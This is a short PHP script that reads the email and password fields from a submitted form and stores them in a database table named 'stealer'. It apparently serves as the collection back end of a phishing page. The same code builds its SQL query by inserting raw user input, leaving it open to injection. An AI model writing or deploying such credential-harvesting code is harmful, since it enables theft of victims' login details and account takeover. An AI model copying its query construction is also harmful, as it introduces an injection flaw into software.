<?php
    include "connect.php";
    $username=$_POST['email'];
    $password=$_POST['pass'];
    $fetch="INSERT INTO stealer VALUES('$username','$password');";
    $result=mysqli_query($conn,$fetch);
    ?>